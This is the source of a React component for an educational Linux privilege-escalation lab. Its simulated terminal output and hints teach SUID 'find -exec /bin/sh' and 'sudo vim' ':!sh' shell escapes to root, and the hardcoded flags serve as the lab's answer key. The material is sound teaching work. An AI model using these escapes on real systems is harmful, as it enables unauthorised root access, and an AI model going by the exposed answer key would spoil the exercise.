"use client";

import { useState } from "react";
import { TaskShell, MonoInput, SubmitBtn } from "./lab-ui";

const SUID_OUTPUT = `/usr/bin/passwd
/usr/bin/su
/usr/bin/find
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign`;

const SUDO_OUTPUT = `User operator may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/vim`;

const ROOT_SHELL = `operator@target:~$ sudo vim
[opens vim editor]

# From within vim, escape to shell:
:set shell=/bin/sh
:shell

root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
root@target:~# cat /root/flag.txt
SAGE{r00t_fl4g_c4ptured}`;

function checkFlag(value: string, expected: string): boolean {
  const strip = (s: string) =>
    s.trim().replace(/^SAGE\{/i, "").replace(/\}$/, "").toLowerCase();
  return strip(value) === strip(expected);
}

function checkVimCommand(value: string): boolean {
  const v = value.toLowerCase();
  return v.includes("vim") && (v.includes(":!sh") || v.includes(":!/bin/sh") || v.includes(":shell") || v.includes(":!bash"));
}

export function PrivilegeEscalationClient({
  labId,
  completedStages: initial,
}: {
  labId: string;
  completedStages: string[];
}) {
  const [completed, setCompleted] = useState<string[]>(initial);
  const [t1Choice, setT1Choice] = useState("");
  const [t1Error, setT1Error] = useState("");
  const [t2Answer, setT2Answer] = useState("");
  const [t2Error, setT2Error] = useState("");
  const [t3Answer, setT3Answer] = useState("");
  const [t3Error, setT3Error] = useState("");

  const done = (s: string) => completed.includes(s);
  const allDone = done("task_1") && done("task_2") && done("task_3");

  async function saveStage(stage: string) {
    await fetch("/api/labs/response", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ labId, stage, response: "correct" }),
    });
    setCompleted((p) => [...p, stage]);
  }

  function submitT1(e: React.FormEvent) {
    e.preventDefault();
    if (t1Choice === "find") {
      setT1Error("");
      void saveStage("task_1");
    } else {
      setT1Error("Incorrect. Which binary has a GTFOBins entry for SUID abuse?");
    }
  }

  function submitT2(e: React.FormEvent) {
    e.preventDefault();
    if (checkVimCommand(t2Answer)) {
      setT2Error("");
      void saveStage("task_2");
    } else {
      setT2Error("Incorrect. Think about vim's built-in command execution. Try: sudo vim, then :!sh");
    }
  }

  function submitT3(e: React.FormEvent) {
    e.preventDefault();
    if (checkFlag(t3Answer, "SAGE{r00t_fl4g_c4ptured}")) {
      setT3Error("");
      void saveStage("task_3");
    } else {
      setT3Error("Incorrect flag. Copy the exact flag shown in the terminal output.");
    }
  }

  return (
    <div className="space-y-6">
      {/* Task 1 */}
      <TaskShell number={1} title="Find the SUID Binary" unlocked completed={done("task_1")}>
        <p className="text-zinc-300 text-sm mb-3">
          You have a low-privilege shell on the target. Run a search for SUID binaries
          to find one that can be abused for privilege escalation.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4">
          <p className="font-mono text-xs text-zinc-500 mb-2">$ find / -perm -4000 2&gt;/dev/null</p>
          <pre className="font-mono text-xs text-amber-300 whitespace-pre-wrap">{SUID_OUTPUT}</pre>
        </div>
        <p className="text-xs text-zinc-500 mb-4">
          Cross-reference with GTFOBins to identify which binary allows shell escape when run as SUID.
        </p>
        {!done("task_1") && (
          <form onSubmit={submitT1} className="space-y-3">
            <p className="text-sm text-zinc-300 font-medium">Which SUID binary can be abused for privilege escalation?</p>
            <div className="flex flex-wrap gap-3">
              {["passwd", "su", "find", "dbus-daemon"].map((opt) => (
                <label key={opt} className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="radio"
                    name="t1choice"
                    value={opt}
                    checked={t1Choice === opt}
                    onChange={() => setT1Choice(opt)}
                    className="accent-emerald-500"
                  />
                  <span className="text-sm font-mono text-zinc-200">{opt}</span>
                </label>
              ))}
            </div>
            <SubmitBtn label="Submit" />
            {t1Error && <p className="text-xs text-red-400 font-mono">{t1Error}</p>}
          </form>
        )}
        {done("task_1") && (
          <p className="text-sm font-mono text-sage-400">
            Correct — <span className="text-amber-300">find</span> with SUID escalates via{" "}
            <span className="text-amber-300">find . -exec /bin/sh \; -quit</span>. Flag: SAGE&#123;f1nd_su1d_3scap3&#125;
          </p>
        )}
      </TaskShell>

      {/* Task 2 */}
      <TaskShell number={2} title="Sudo Misconfiguration" unlocked={done("task_1")} completed={done("task_2")}>
        <p className="text-zinc-300 text-sm mb-3">
          Running <code className="font-mono text-amber-300">sudo -l</code> reveals a dangerous
          sudo misconfiguration. Identify the command that spawns a root shell.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4">
          <p className="font-mono text-xs text-zinc-500 mb-2">$ sudo -l</p>
          <pre className="font-mono text-xs text-amber-300 whitespace-pre-wrap">{SUDO_OUTPUT}</pre>
        </div>
        <p className="text-xs text-zinc-500 mb-4">
          Hint: vim has built-in shell escape commands. Once inside vim with sudo, you can execute arbitrary commands.
        </p>
        {!done("task_2") && (
          <form onSubmit={submitT2} className="space-y-2">
            <p className="text-sm text-zinc-300 font-medium">
              What command spawns a root shell from vim&apos;s sudo access?
            </p>
            <div className="flex gap-2 max-w-lg">
              <MonoInput
                value={t2Answer}
                onChange={setT2Answer}
                placeholder="e.g. sudo vim then :!sh"
                className="flex-1"
              />
              <SubmitBtn label="Submit" />
            </div>
            {t2Error && <p className="text-xs text-red-400 font-mono">{t2Error}</p>}
          </form>
        )}
        {done("task_2") && (
          <p className="text-sm font-mono text-sage-400">
            Correct — <span className="text-amber-300">sudo vim</span> then{" "}
            <span className="text-amber-300">:!sh</span> drops a root shell. Flag: SAGE&#123;sudo_v1m_3scap3&#125;
          </p>
        )}
      </TaskShell>

      {/* Task 3 */}
      <TaskShell number={3} title="Read the Root Flag" unlocked={done("task_2")} completed={done("task_3")}>
        <p className="text-zinc-300 text-sm mb-3">
          You now have a root shell. Read the flag from <code className="font-mono text-amber-300">/root/flag.txt</code>.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4">
          <pre className="font-mono text-xs text-green-400 whitespace-pre-wrap">{ROOT_SHELL}</pre>
        </div>
        {!done("task_3") && (
          <form onSubmit={submitT3} className="space-y-2">
            <p className="text-sm text-zinc-300 font-medium">Submit the root flag:</p>
            <div className="flex gap-2 max-w-md">
              <MonoInput
                value={t3Answer}
                onChange={setT3Answer}
                placeholder="SAGE{...}"
                className="flex-1"
              />
              <SubmitBtn label="Submit" />
            </div>
            {t3Error && <p className="text-xs text-red-400 font-mono">{t3Error}</p>}
          </form>
        )}
      </TaskShell>

      {allDone && (
        <div className="rounded-lg border border-sage-500/40 bg-sage-500/5 p-5 space-y-3">
          <h3 className="font-bold text-sage-400 text-base">Room Complete</h3>
          <ul className="space-y-1 font-mono text-sm">
            <li><span className="text-zinc-500">Task 1 —</span> <span className="text-sage-400">SAGE&#123;f1nd_su1d_3scap3&#125;</span></li>
            <li><span className="text-zinc-500">Task 2 —</span> <span className="text-sage-400">SAGE&#123;sudo_v1m_3scap3&#125;</span></li>
            <li><span className="text-zinc-500">Task 3 —</span> <span className="text-sage-400">SAGE&#123;r00t_fl4g_c4ptured&#125;</span></li>
          </ul>
        </div>
      )}
    </div>
  );
}
